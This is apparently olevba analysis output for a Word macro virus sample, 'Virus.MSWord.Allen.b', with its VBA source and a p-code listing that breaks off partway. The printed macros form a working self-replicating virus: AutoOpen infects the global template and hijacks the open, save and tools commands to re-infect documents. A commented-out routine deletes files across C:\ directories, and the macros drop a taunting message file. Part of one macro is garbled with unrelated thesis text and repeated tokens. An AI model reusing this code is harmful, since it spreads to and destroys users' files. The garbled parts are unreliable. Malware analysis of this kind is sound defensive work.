olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Allen.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO RpFO.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/RpFO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
On Error GoTo -1: On Error GoTo Bail
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg

WordBasic.FileOpen dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpFO"
WordBasic.MacroCopy "Global:RpFO", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
WordBasic.MsgBox "Thank's for joining with us !", "@Rapi.Kom"
GoTo Done
Bail:
If Err.Number <> 102 Then
    WordBasic.FileOpen dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpAE.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/RpAE'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim tgl$
Dim tgl_
Dim tahun$
Dim tahun_
Dim Semua$
Dim hari$
Dim bulan$
Dim pukul$
Dim Bacalah$
'tgl = Day(Now())
'jam = Hour(Now())
'If tgl < 20 Then Goto Selamat
'If jam < 11 Then Goto Selamat
'Dim Sehat$(20)
'Dim Subur$(20)
'ChDir "C:\"
'Dim subdirs$(CountDirectories())
'subdirs$(0) = "[..]"
'For i = 1 To CountDirectories()
'   Print "Reading menu...Please wait !"
'   Subdirs$(i) = UCase$(GetDirectory$(i))
'   If Subdirs$(i) = "WINDOWS" Then Goto lewat
'   If Subdirs$(i) = "WINWORD" Then Goto lewat
'   If Subdirs$(i) = "WINWORD6" Then Goto lewat
'   Ojek$ = "C:\" + Subdirs$(i) + "\*.*"
'   Kill ojek$
'   ChDir  Subdirs$(i)
'       Subur$(0) = "[..]"
'       For a = 1 To CountDirectories()
'           Print "Reading menu...Please wait !"
'           subur$(a) = UCase$(GetDirectory$(a))
'           If subur$(a) = "WINWORD" Then Goto pass
'           If subur$(a) = " WINWORD6" Then Goto pass
'           Penyakit$ = "C:\" + subdirs$(i) + "\" + subur$(a) + "\*.*"
'           Kill Penyakit Else / CheckDialog Single Integer WordBasic.Input Double Private Declare Private Declare Lib Else Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let /
                                ; Double Alias 'ks ..........................................................................   70"&chr(13)&"   BAB V   :   PEMBAHA Private Declare Lib Else Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let / WordBasic.Input Is <> / / / / Private Declare Let Else Private Declare                                                                                                 29545  Else
29537  Else

gan XRD ............................................................    72"&chr(13)&"               B. Mekanisme penyusutan serbuk komREMk selama sintering ............    73"&chr(13)&"           C. Faktor-faktor yang menentukan densitas prbulan
l

tgl$ = Str(tgl_)
tahun$ = Str(tahun_)
Semua$ = hari$ + ", " + tgl$ + " " + bulan$ + " " + tahun$ + ", Jam :" + pukul$ + "."
'Pesan$ = "Anda rupanya sedang sial, semua file di mesin ini kecuali yang berada di direktori WINDOWS dan WINWORD telah hilang, jangan kaget, ini bukan ulah Anda, tapi ini hasil pekerjaan saya...Barang siapa yang berhasil menemukan cara menangkal virus ini
', saya aka" + "n memberi listing virus ini untuk Anda !!! Dan tentu saja saya akan terus datang kesini untuk memberi Anda salam dengan virus-virus terbaru dari saya...selamat !   Bandung, " + semua$
Bacalah$ = "Assalamualaikum ..., maaf @Rapi.Kom mengganggu anda sebentar. Pesan ini aslinya bernama  PESAN.TXT  yang  muncul  di  root direktori  setelah  anda menjalankan Winword 6.0 yang templatenya (normal.dot)  telah  tertulari  macro  menjijikkan ini. Macro ini " + "(sebe" + "lum @R" + "a" + "pi" + ".Kom modifikasi)  berasal  dari  file data Winword 6.0 (*.doc) yang telah tertular macro ini. Bila file data tersebut  di pangggil (Open doc), maka macro secara otomatis menjalankan perintah-perintah macro lain nya,  yang antara  lain mengcopykan  diri ke" + " gl" + "o" + "bal " + "template (normal.dot), juga pada tanggal dan jam tertentu akan menghapus semua data di direktori tingkat 1, 2 dan 3 (kecuali Hidden direktori), menjengkelkan bukan ?!. Siapapun pembuatnya pastilah orang yang sirik !,  masih banyak perbuatan baik lain yang" + "  bisa  kita kerjakan.         ... Malang, " + Semua$ + " @Rapi.Kom"
Open "C:\BACALAH.TXT" For Output As 1
Write #1, Bacalah$
Close 1
'Selamat:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpAO.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/RpAO'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "ScanProt macro to install protection macros, disinfect your Normal (Global) template and run the CleanAll macro."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.AutoOpen.MAIN"
Dim sMe$
Dim sMacro$
On Error GoTo -1: On Error GoTo Abort
    sMe$ = WordBasic.[FileName$]()
    sMacro$ = sMe$ + ":RpAE"
    WordBasic.MacroCopy sMacro$, "Global:Autoexec"
    sMacro$ = sMe$ + ":RpAE"
    WordBasic.MacroCopy sMacro$, "Global:RpAE"
    sMacro$ = sMe$ + ":AutoOpen"
    WordBasic.MacroCopy sMacro$, "Global:RpAO"
    sMacro$ = sMe$ + ":RpFS"
    WordBasic.MacroCopy sMacro$, "Global:FileSave"
    sMacro$ = sMe$ + ":RpFS"
    WordBasic.MacroCopy sMacro$, "Global:RpFS"
    sMacro$ = sMe$ + ":RpFSA"
    WordBasic.MacroCopy sMacro$, "Global:FileSaveAs"
    sMacro$ = sMe$ + ":RpFSA"
    WordBasic.MacroCopy sMacro$, "Global:RpFSA"
    sMacro$ = sMe$ + ":RpFO"
    WordBasic.MacroCopy sMacro$, "Global:FileOpen"
    sMacro$ = sMe$ + ":RpFO"
    WordBasic.MacroCopy sMacro$, "Global:RpFO"
    sMacro$ = sMe$ + ":RpTC"
    WordBasic.MacroCopy sMacro$, "Global:ToolsCustomize"
    sMacro$ = sMe$ + ":RpTM"
    WordBasic.MacroCopy sMacro$, "Global:ToolsMacro"
Abort:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSave.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/FileSave'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.RpFS.MAIN"
Dim sMe$
Dim sTMacro$
WordBasic.FileSave
On Error GoTo -1: On Error GoTo Bail

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
WordBasic.FileSaveAs dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
GoTo Done
Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpFS.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/RpFS'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves the active document or template"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.RpFS.MAIN"
Dim sMe$
Dim sTMacro$
WordBasic.FileSave
On Error GoTo -1: On Error GoTo Bail

Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
If dlg.Format = 0 Then dlg.Format = 1
WordBasic.FileSaveAs dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
GoTo Done
Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSaveAs.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/FileSaveAs'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.RpFSA.MAIN"
Dim sMe$
Dim sTMacro$
On Error GoTo -1: On Error GoTo Bail
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg

If dlg.Format = 0 Then dlg.Format = 1
WordBasic.FileSaveAs dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpFO"
WordBasic.MacroCopy "Global:RpFO", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO RpFSA.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/RpFSA'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Saves a copy of the document in a separate file"
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "TemplateProject.RpFSA.MAIN"
Dim sMe$
Dim sTMacro$
On Error GoTo -1: On Error GoTo Bail
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs dlg
WordBasic.Dialog.FileSaveAs dlg

If dlg.Format = 0 Then dlg.Format = 1
WordBasic.FileSaveAs dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpFO"
WordBasic.MacroCopy "Global:RpFO", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
GoTo Done

Bail:
If Err.Number <> 102 Then
    WordBasic.FileSaveAs dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileOpen.bas 
in file: ./Virus.MSWord.Allen.b - OLE stream: 'Macros/VBA/FileOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim sMe$
Dim sTMacro$
On Error GoTo -1: On Error GoTo Bail
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen dlg
WordBasic.Dialog.FileOpen dlg

WordBasic.FileOpen dlg
sMe$ = WordBasic.[FileName$]()
sTMacro$ = sMe$ + ":RpAE"
WordBasic.MacroCopy "Global:RpAE", sTMacro$
sTMacro$ = sMe$ + ":AutoOpen"
WordBasic.MacroCopy "Global:RpAO", sTMacro$
sTMacro$ = sMe$ + ":RpFS"
WordBasic.MacroCopy "Global:RpFS", sTMacro$
sTMacro$ = sMe$ + ":RpFO"
WordBasic.MacroCopy "Global:RpFO", sTMacro$
sTMacro$ = sMe$ + ":RpTC"
WordBasic.MacroCopy "Global:ToolsCustomize", sTMacro$
sTMacro$ = sMe$ + ":RpTM"
WordBasic.MacroCopy "Global:ToolsMacro", sTMacro$
sTMacro$ = sMe$ + ":RpFSA"
WordBasic.MacroCopy "Global:RpFSA", sTMacro$
WordBasic.MsgBox "Thank's for joining with us !", "@Rapi.Kom"
GoTo Done
Bail:
If Err.Number <> 102 Then
    WordBasic.FileOpen dlg
End If
Done:
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Allen.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/RpFO - 2342 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sTMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Bail 
' Line #5:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileOpen 0x0001 
' 	Set dlg 
' Line #6:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileOpen 0x0001 
' Line #7:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileOpen 0x0001 
' Line #8:
' Line #9:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #10:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #11:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpAE"
' 	Add 
' 	St sTMacro$ 
' Line #12:
' 	LitStr 0x000B "Global:RpAE"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #13:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sTMacro$ 
' Line #14:
' 	LitStr 0x000B "Global:RpAO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #15:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFS"
' 	Add 
' 	St sTMacro$ 
' Line #16:
' 	LitStr 0x000B "Global:RpFS"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #17:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFO"
' 	Add 
' 	St sTMacro$ 
' Line #18:
' 	LitStr 0x000B "Global:RpFO"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #19:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTC"
' 	Add 
' 	St sTMacro$ 
' Line #20:
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #21:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTM"
' 	Add 
' 	St sTMacro$ 
' Line #22:
' 	LitStr 0x0011 "Global:ToolsMacro"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #23:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":RpFSA"
' 	Add 
' 	St sTMacro$ 
' Line #24:
' 	LitStr 0x000C "Global:RpFSA"
' 	Ld sTMacro$ 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #25:
' 	LitStr 0x001D "Thank's for joining with us !"
' 	LitStr 0x0009 "@Rapi.Kom"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0002 
' Line #26:
' 	GoTo Done 
' Line #27:
' 	Label Bail 
' Line #28:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #29:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileOpen 0x0001 
' Line #30:
' 	EndIfBlock 
' Line #31:
' 	Label Done 
' Line #32:
' 	EndSub 
' Macros/VBA/RpAE - 7573 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn tgl
' Line #3:
' 	Dim 
' 	VarDefn tgl_
' Line #4:
' 	Dim 
' 	VarDefn tahun
' Line #5:
' 	Dim 
' 	VarDefn tahun_
' Line #6:
' 	Dim 
' 	VarDefn Semua
' Line #7:
' 	Dim 
' 	VarDefn hari
' Line #8:
' 	Dim 
' 	VarDefn bulan
' Line #9:
' 	Dim 
' 	VarDefn pukul
' Line #10:
' 	Dim 
' 	VarDefn Bacalah
' Line #11:
' 	QuoteRem 0x0000 0x0010 "tgl = Day(Now())"
' Line #12:
' 	QuoteRem 0x0000 0x0011 "jam = Hour(Now())"
' Line #13:
' 	QuoteRem 0x0000 0x001D "If tgl < 20 Then Goto Selamat"
' Line #14:
' 	QuoteRem 0x0000 0x001D "If jam < 11 Then Goto Selamat"
' Line #15:
' 	QuoteRem 0x0000 0x000E "Dim Sehat$(20)"
' Line #16:
' 	QuoteRem 0x0000 0x000E "Dim Subur$(20)"
' Line #17:
' 	QuoteRem 0x0000 0x000B "ChDir "C:\""
' Line #18:
' 	QuoteRem 0x0000 0x0020 "Dim subdirs$(CountDirectories())"
' Line #19:
' 	QuoteRem 0x0000 0x0014 "subdirs$(0) = "[..]""
' Line #20:
' 	QuoteRem 0x0000 0x001F "For i = 1 To CountDirectories()"
' Line #21:
' 	QuoteRem 0x0000 0x0027 "   Print "Reading menu...Please wait !""
' Line #22:
' 	QuoteRem 0x0000 0x0029 "   Subdirs$(i) = UCase$(GetDirectory$(i))"
' Line #23:
' 	QuoteRem 0x0000 0x002D "   If Subdirs$(i) = "WINDOWS" Then Goto lewat"
' Line #24:
' 	QuoteRem 0x0000 0x002D "   If Subdirs$(i) = "WINWORD" Then Goto lewat"
' Line #25:
' 	QuoteRem 0x0000 0x002E "   If Subdirs$(i) = "WINWORD6" Then Goto lewat"
' Line #26:
' 	QuoteRem 0x0000 0x0027 "   Ojek$ = "C:\" + Subdirs$(i) + "\*.*""
' Line #27:
' 	QuoteRem 0x0000 0x000D "   Kill ojek$"
' Line #28:
' 	QuoteRem 0x0000 0x0015 "   ChDir  Subdirs$(i)"
' Line #29:
' 	QuoteRem 0x0000 0x0019 "       Subur$(0) = "[..]""
' Line #30:
' 	QuoteRem 0x0000 0x0026 "       For a = 1 To CountDirectories()"
' Line #31:
' 	QuoteRem 0x0000 0x002F "           Print "Reading menu...Please wait !""
' Line #32:
' 	QuoteRem 0x0000 0x002F "           subur$(a) = UCase$(GetDirectory$(a))"
' Line #33:
' 	QuoteRem 0x0000 0x0032 "           If subur$(a) = "WINWORD" Then Goto pass"
' Line #34:
' 	QuoteRem 0x0000 0x0034 "           If subur$(a) = " WINWORD6" Then Goto pass"
' Line #35:
' 	QuoteRem 0x0000 0x0045 "           Penyakit$ = "C:\" + subdirs$(i) + "\" + subur$(a) + "\*.*""
' Line #36:
' 	QuoteRem 0x0000 0x0150 "           Kill Penyakit Else / CheckDialog Single Integer WordBasic.Input Double Private Declare Private Declare Lib Else Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let /"
' Line #37:
' 	Reparse 0x02A9 "                                ; Double Alias 'ks ..........................................................................   70"&chr(13)&"   BAB V   :   PEMBAHA Private Declare Lib Else Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let Let / WordBasic.Input Is <> / / / / Private Declare Let Else Private Declare                                                                                                 29545  Else"
' Line #38:
' 	LineNum 29537 
' 	ElseBlock 
' Line #39:
' Line #40:
' 	Reparse 0x00F8 "gan XRD ............................................................    72"&chr(13)&"               B. Mekanisme penyusutan serbuk komREMk selama sintering ............    73"&chr(13)&"           C. Faktor-faktor yang menentukan densitas prbulan
' l
' "
' Line #41:
' 	Ld tgl_ 
' 	ArgsLd Str 0x0001 
' 	St tgl$ 
' Line #42:
' 	Ld tahun_ 
' 	ArgsLd Str 0x0001 
' 	St tahun$ 
' Line #43:
' 	Ld hari$ 
' 	LitStr 0x0002 ", "
' 	Add 
' 	Ld tgl$ 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld bulan$ 
' 	Add 
' 	LitStr 0x0001 " "
' 	Add 
' 	Ld tahun$ 
' 	Add 
' 	LitStr 0x0007 ", Jam :"
' 	Add 
' 	Ld pukul$ 
' 	Add 
' 	LitStr 0x0001 "."
' 	Add 
' 	St Semua$ 
' Line #44:
' 	QuoteRem 0x0000 0x00FF "Pesan$ = "Anda rupanya sedang sial, semua file di mesin ini kecuali yang berada di direktori WINDOWS dan WINWORD telah hilang, jangan kaget, ini bukan ulah Anda, tapi ini hasil pekerjaan saya...Barang siapa yang berhasil menemukan cara menangkal virus ini"
' Line #45:
' 	QuoteRem 0x0000 0x00C6 ", saya aka" + "n memberi listing virus ini untuk Anda !!! Dan tentu saja saya akan terus datang kesini untuk memberi Anda salam dengan virus-virus terbaru dari saya...selamat !   Bandung, " + semua$"
' Line #46:
' 	LitStr 0x00FF "Assalamualaikum ..., maaf @Rapi.Kom mengganggu anda sebentar. Pesan ini aslinya bernama  PESAN.TXT  yang  muncul  di  root direktori  setelah  anda menjalankan Winword 6.0 yang templatenya (normal.dot)  telah  tertulari  macro  menjijikkan ini. Macro ini "
' 	LitStr 0x0005 "(sebe"
' 	Add 
' 	LitStr 0x0006 "lum @R"
' 	Add 
' 	LitStr 0x0001 "a"
' 	Add 
' 	LitStr 0x0002 "pi"
' 	Add 
' 	LitStr 0x00FF ".Kom modifikasi)  berasal  dari  file data Winword 6.0 (*.doc) yang telah tertular macro ini. Bila file data tersebut  di pangggil (Open doc), maka macro secara otomatis menjalankan perintah-perintah macro lain nya,  yang antara  lain mengcopykan  diri ke"
' 	Add 
' 	LitStr 0x0003 " gl"
' 	Add 
' 	LitStr 0x0001 "o"
' 	Add 
' 	LitStr 0x0004 "bal "
' 	Add 
' 	LitStr 0x00FF "template (normal.dot), juga pada tanggal dan jam tertentu akan menghapus semua data di direktori tingkat 1, 2 dan 3 (kecuali Hidden direktori), menjengkelkan bukan ?!. Siapapun pembuatnya pastilah orang yang sirik !,  masih banyak perbuatan baik lain yang"
' 	Add 
' 	LitStr 0x002B "  bisa  kita kerjakan.         ... Malang, "
' 	Add 
' 	Ld Semua$ 
' 	Add 
' 	LitStr 0x000A " @Rapi.Kom"
' 	Add 
' 	St Bacalah$ 
' Line #47:
' 	LitStr 0x000E "C:\BACALAH.TXT"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	WriteChan 
' 	Ld Bacalah$ 
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Close 0x0001 
' Line #50:
' 	QuoteRem 0x0000 0x0008 "Selamat:"
' Line #51:
' 	EndSub 
' Macros/VBA/RpAO - 2516 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn sMe
' Line #3:
' 	Dim 
' 	VarDefn sMacro
' Line #4:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Abort 
' Line #5:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St sMe$ 
' Line #6:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpAE"
' 	Add 
' 	St sMacro$ 
' Line #7:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:Autoexec"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #8:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpAE"
' 	Add 
' 	St sMacro$ 
' Line #9:
' 	Ld sMacro$ 
' 	LitStr 0x000B "Global:RpAE"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #10:
' 	Ld sMe$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sMacro$ 
' Line #11:
' 	Ld sMacro$ 
' 	LitStr 0x000B "Global:RpAO"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #12:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFS"
' 	Add 
' 	St sMacro$ 
' Line #13:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:FileSave"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #14:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFS"
' 	Add 
' 	St sMacro$ 
' Line #15:
' 	Ld sMacro$ 
' 	LitStr 0x000B "Global:RpFS"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #16:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":RpFSA"
' 	Add 
' 	St sMacro$ 
' Line #17:
' 	Ld sMacro$ 
' 	LitStr 0x0011 "Global:FileSaveAs"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #18:
' 	Ld sMe$ 
' 	LitStr 0x0006 ":RpFSA"
' 	Add 
' 	St sMacro$ 
' Line #19:
' 	Ld sMacro$ 
' 	LitStr 0x000C "Global:RpFSA"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #20:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFO"
' 	Add 
' 	St sMacro$ 
' Line #21:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Global:FileOpen"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #22:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpFO"
' 	Add 
' 	St sMacro$ 
' Line #23:
' 	Ld sMacro$ 
' 	LitStr 0x000B "Global:RpFO"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #24:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTC"
' 	Add 
' 	St sMacro$ 
' Line #25:
' 	Ld sMacro$ 
' 	LitStr 0x0015 "Global:ToolsCustomize"
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0002 
' Line #26:
' 	Ld sMe$ 
' 	LitStr 0x0005 ":RpTM"
' 	Add 
' 	St sMacro$ 
' Line #27:
